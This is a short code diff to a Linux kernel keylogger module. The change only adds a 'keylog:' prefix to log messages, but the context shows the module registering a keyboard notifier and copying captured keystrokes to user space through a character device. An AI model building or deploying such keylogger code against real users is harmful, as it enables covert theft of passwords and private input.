@@ -57,7 +57,8 @@ static ssize_t kl_device_read(struct file *fp, char __user *buf, size_t len,
 
 	ret = copy_to_user(buf, input_buf, buflen);
 	if (ret) {
-		printk(KERN_ERR "Unable to copy from kernel buffer to user space buffer\n");
+		printk(KERN_ERR
+		       "keylog: Unable to copy from kernel buffer to user space buffer\n");
 		return -ret;
 	}
 
@@ -73,15 +74,17 @@ static int __init kl_init(void)
 
 	ret = register_chrdev(0, DEVICE_NAME, &fops);
 	if (ret < 0) {
-		printk(KERN_ERR "Unable to register character device\n");
+		printk(KERN_ERR
+		       "keylog: Unable to register character device\n");
 		return ret;
 	}
 	major = ret;
-	printk(KERN_INFO "Registered device major number: %u\n", major);
+	printk(KERN_INFO "keylog: Registered device major number %u\n", major);
 
 	ret = register_keyboard_notifier(&kl_notifier_block);
 	if (ret) {
-		printk(KERN_ERR "Unable to register keyboard notifier\n");
+		printk(KERN_ERR
+		       "keylog: Unable to register keyboard notifier\n");
 		return -ret;
 	}
 
